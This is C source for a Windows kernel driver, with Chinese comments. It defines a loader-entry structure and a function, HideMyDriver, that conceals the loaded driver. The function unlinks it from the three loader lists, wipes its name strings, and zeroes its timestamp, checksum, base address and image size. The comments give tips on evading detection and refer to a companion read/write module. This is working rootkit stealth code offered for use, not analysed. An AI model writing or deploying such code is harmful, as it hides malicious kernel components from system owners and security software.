#include <ntifs.h>

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG64 OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

// 摘链：三个链表一起断，只断一个会被 PspCidTable / MiSystemPartition 那边反查出来
VOID HideMyDriver(IN PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY_FULL entry = (PLDR_DATA_TABLE_ENTRY_FULL)DriverObject->DriverSection;
    if (!entry) return;

    // 1. 三联表摘链
    RemoveEntryList(&entry->InLoadOrderLinks);
    RemoveEntryList(&entry->InMemoryOrderLinks);
    RemoveEntryList(&entry->InInitializationOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InMemoryOrderLinks);
    InitializeListHead(&entry->InInitializationOrderLinks);

    // 2. 抹名字（BaseDllName / FullDllName 指向的字符串在池里，先清零再改长度）
    if (entry->BaseDllName.Buffer && entry->BaseDllName.MaximumLength) {
        RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.MaximumLength);
        entry->BaseDllName.Length = 0;
    }
    if (entry->FullDllName.Buffer && entry->FullDllName.MaximumLength) {
        RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.MaximumLength);
        entry->FullDllName.Length = 0;
    }

    // 3. 清 DriverSection 的尾部指纹与时间戳
    entry->TimeDateStamp = 0;
    entry->CheckSum = 0;
    entry->DllBase = NULL;   // 视你的读写模块是否还需要自己基址而定，需要就先存全局变量
    entry->SizeOfImage = 0;
}
